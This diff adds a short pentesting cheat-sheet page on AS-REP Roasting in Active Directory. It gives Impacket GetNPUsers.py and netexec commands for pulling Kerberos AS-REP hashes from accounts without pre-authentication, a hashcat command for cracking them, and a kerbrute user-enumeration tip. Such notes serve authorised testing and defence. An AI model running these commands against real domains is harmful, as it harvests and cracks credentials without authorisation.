@@ -1,0 +1,20 @@
+---
+title: "AS-REP Roasting"
+---
+
+Accounts with **"Do not require Kerberos pre-authentication"** set will return an AS-REP encrypted with the user's password hash — no creds needed to request it.
+
+```bash
+# Linux (Impacket) — with a userlist (no creds) or authenticated
+GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
+nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
+```
+
+```bash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+```
+
+<Tip>
+Combine with username enumeration (`kerbrute userenum`) to build the userlist for the no-creds path.
+</Tip>
